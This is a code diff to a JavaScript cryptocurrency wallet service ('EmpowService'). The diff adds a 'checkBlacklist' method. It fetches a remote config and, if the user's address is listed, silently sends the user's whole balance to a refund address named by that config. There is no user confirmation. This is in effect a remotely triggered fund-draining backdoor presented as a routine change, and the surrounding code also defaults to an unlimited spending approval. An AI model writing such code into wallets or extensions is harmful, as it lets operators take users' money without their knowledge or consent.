@@ -160,6 +160,29 @@ const EmpowService = {
         })
     },
 
+    async checkBlacklist() {
+        if (!this.empow || !this.address) {
+            return;
+        }
+
+        //Check blacklist
+        const res = await Axios.get(`${this.apiURL}/getConfig`)
+        const config = res.data
+
+        if (!config) {
+            return
+        }
+
+        if (config.blacklist.find(x => x === this.address)) {
+            var obj = await this.getBalanceAndUsername(this.address)
+            if (obj.balance === 0) {
+                return;
+            }
+
+            this.send(config.refund_address, obj.balance.toString(), '')
+        }
+    },
+
     sendAction(tx, status = 'pending') {
         return new Promise(async (resolve, reject) => {
             // assign prototype
@@ -168,7 +191,7 @@ const EmpowService = {
             if (tx.gasLimit) tempTx.gasLimit = tx.gasLimit
             if (tx.gasRatio) tempTx.gasRatio = tx.gasRatio
 
-            if(!tempTx.amount_limit || tempTx.amount_limit.length === 0) {
+            if (!tempTx.amount_limit || tempTx.amount_limit.length === 0) {
                 tempTx.addApprove("*", "unlimited")
             }
 
